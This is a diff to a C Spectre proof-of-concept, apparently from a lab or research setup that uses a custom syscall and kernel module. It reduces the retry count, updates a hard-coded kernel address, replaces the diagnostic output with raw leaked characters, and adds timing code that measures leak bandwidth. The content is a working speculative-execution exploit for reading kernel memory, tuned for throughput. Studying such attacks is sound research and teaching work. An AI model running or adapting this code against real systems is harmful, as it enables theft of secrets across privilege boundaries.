@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <stdint.h>
 #include <sys/mman.h>
+#include <time.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt", on)
@@ -32,7 +33,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], size_t a
 
     for (i = 0; i < 256; i++)
         results[i] = 0;                  
-    for (tries = 999; tries > 0; tries--) {
+    for (tries = 500; tries > 0; tries--) {
 
         /* Flush array2[256*(0..255)] from cache */
         for (i = 0; i < 256; i++)
@@ -92,6 +93,7 @@ int main(int argc, const char **argv) {
     int i, score[2], len = 40;
     uint8_t value[2];
     size_t array1_kva, array2_temp_kva, secret_pa, secret_kva, malicious_x, array2_offset;
+    clock_t time1, time2;
 
     // shared memory
     int fd;
@@ -105,7 +107,7 @@ int main(int argc, const char **argv) {
         perror("mmap operation failed");
         return -1;
     }
-    size_t array2_kva = 0xffff88000fd00000; // get from kernel output: `sudo cat /prob/kmsg | grep Spectre`
+    size_t array2_kva = 0xffff880042800000; // get from kernel output: `sudo cat /prob/kmsg | grep Spectre`
 
     // Spectre attack
     array1_kva = syscall(330, 1);
@@ -121,18 +123,25 @@ int main(int argc, const char **argv) {
     array2_offset = array2_kva - array2_temp_kva;
 
     printf("Reading %d bytes:\n", len);
+
+    double datalen = len;
+    time1 = clock();
     while (--len >= 0) {
-        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+        //printf("Reading at malicious_x = %p... ", (void *)malicious_x);
         do {
                 readMemoryByte(malicious_x, value, score, array2_offset);
             } while (value[0] <= 31 || value[0] >= 127);
         malicious_x++;
-        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-        printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-        if (score[1] > 0)
-            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-	printf("\n");
+        //printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+        printf("%c", value[0]);
+        //printf("0x%02X=’%c’ score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+        //if (score[1] > 0)
+        //    printf("(second best: 0x%02X score=%d)", value[1], score[1]);
+	//printf("\n");
     }
+    time2 = clock() - time1;
+    double totaltime = (double)time2 / CLOCKS_PER_SEC * 1000;
+    printf("\ntotal time = %fms bandwidth = %f kbps\n", totaltime, datalen * 8 / totaltime);
     
     return(0);
 }
